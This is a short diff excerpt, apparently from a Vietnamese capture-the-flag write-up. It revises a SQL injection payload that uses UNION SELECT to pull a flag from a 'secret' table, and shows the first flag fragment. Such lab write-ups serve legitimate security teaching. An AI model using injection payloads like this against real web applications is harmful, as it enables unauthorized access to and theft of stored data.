@@ -123,7 +123,7 @@ show_source(__FILE__);
     + Mục tiêu đầu tiên của chúng ta là flag trong phần serect.
     + Payload của mình:
       ```sql
-      ?name=hehehehe'union%20select%20null,flag%20from%20secret--%20-name=guest'%20union%20select
+      ?name=hehehehe'union%20select%20null,flag%20from%20secret--%20-name=hehehehe'%20union%20select
       ```
     + Part1: ```W1{par1```
 - Part2:
